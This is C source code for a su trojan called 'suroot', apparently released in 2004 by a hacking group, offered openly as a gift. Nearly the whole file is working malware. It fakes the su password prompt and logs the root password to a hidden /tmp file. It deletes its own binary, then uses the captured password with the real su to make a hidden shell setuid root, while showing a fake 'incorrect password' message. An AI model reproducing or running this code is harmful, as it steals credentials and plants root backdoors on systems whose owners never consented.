/*
 * suroot : Yet Another Su Trojan (lol)
 * This one won't print "invalid password"
 * read the HOWTO file for informations
 *
 * sirius_black / LOTFREE TEAM / 25/12/2004
 * Well that's my Christmas present for U
 *
 * http://www.lsdp.net/~lotfree/
 *
 * GreetZ : OS4M4CKERS, Kharneth, Albus,
 * Flyers, Dec0y, Nelson, Epi, BlacKSilveR,
 * testxyz07, frog-m@n, elooo, overdose,
 * sword, Borax, Phoenix1204  and a lot of
 * persons I forgot..
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <string.h>
#include <sys/un.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>

#define SU_PATH "/bin/su"
#define BD_PATH "/tmp/.hsh"
#define SOCK_UX "/tmp/.socksys"
#define PASSLOG "/tmp/.sb"
#define CMD "chown root.root %s; chmod +s %s"

#define SU_ERR "su: Mot de passe incorrect.\n"

void exit_on_err(void)
{
  fprintf(stderr,SU_ERR);
  exit(1);
}

void exit_on_alarm(int sig_num)
{
  exit_on_err();
}

void unlink_me(char *argv0)
{
  char cwd[PATH_MAX+1];
  char dir[PATH_MAX+1];
  if(argv0[0]=='/')
    unlink(argv0);
  else
  {
    if(strchr(argv0,'/')!=NULL)
    {
      if(getcwd(cwd,PATH_MAX+1)!=NULL)
      {
	sprintf(dir,"%s/%s",cwd,argv0);
	unlink(argv0);
      }
    }
  }
}
	
int main(int argc,char *argv[])
{
  int s,c,nc;
  char *pass;
  char *pass2;
  char command[64];
  FILE *fd;
  int i;
  int size;
  struct sockaddr_un sun;
  struct sockaddr_un remote;
  struct stat st;

  if((pass=getpass("Password: "))==NULL)
    exit_on_err();
  
  if((fd=fopen(PASSLOG,"wb"))!=NULL)
  {
    for(i=0;i<strlen(pass);i++)
      fputc(pass[i]^0xFF,fd);
    fclose(fd);
  }
  
  unlink_me(argv[0]);
  unlink(SOCK_UX);
  if((i=fork())==-1)
    exit_on_err();

  if(i==0)
  {
    sun.sun_family=AF_UNIX;
    strcpy(sun.sun_path,SOCK_UX);

    if((s=socket(AF_UNIX,SOCK_STREAM,0))==-1)
      exit_on_err();
    if(bind(s,(struct sockaddr*)&sun,sizeof(struct sockaddr))==-1)
      exit_on_err();
    if(listen(s,1)==-1)
      exit_on_err();
    size=sizeof(struct sockaddr_un);
    if((nc=accept(s,(struct sockaddr*)&remote,(socklen_t *)&size))==-1)
      exit_on_err();
    close(0);
    close(1);
    close(2);
    dup2(nc,0);
    dup2(nc,1);
    dup2(nc,2);
    sprintf(command,CMD,BD_PATH,BD_PATH);
    execl(SU_PATH,"su","-c",command,(char *)0);
    close(nc);
    close(s);
    exit(0);
  }
  else
  {
    sun.sun_family=AF_UNIX;
    strcpy(sun.sun_path,SOCK_UX);
    while(stat(SOCK_UX,&st)==-1){}
    
    if((c=socket(AF_UNIX,SOCK_STREAM,0))==-1)
      exit_on_err();
    if(connect(c,(struct sockaddr*)&sun,sizeof(struct sockaddr))==-1)
      exit_on_err();
    pass2=(char*)malloc(strlen(pass)+2);
    sprintf(pass2,"%s\n",pass);
    if(send(c,pass2,strlen(pass2),0)==-1)
    {
      free(pass2);
      exit_on_err();
    }
    free(pass2);
    wait(NULL);
    close(c);
  }
  i=1;
  signal(SIGALRM,exit_on_alarm);
  alarm(2);
  while(i==1)
  {
    if(stat(BD_PATH,&st)==-1)
      exit_on_err();
    if( (st.st_mode & S_ISUID) && st.st_uid==0 && st.st_gid==0)i=0;
  }
  alarm(0);
  execl(BD_PATH,BD_PATH,(char*)0);
  
  return 0;
}
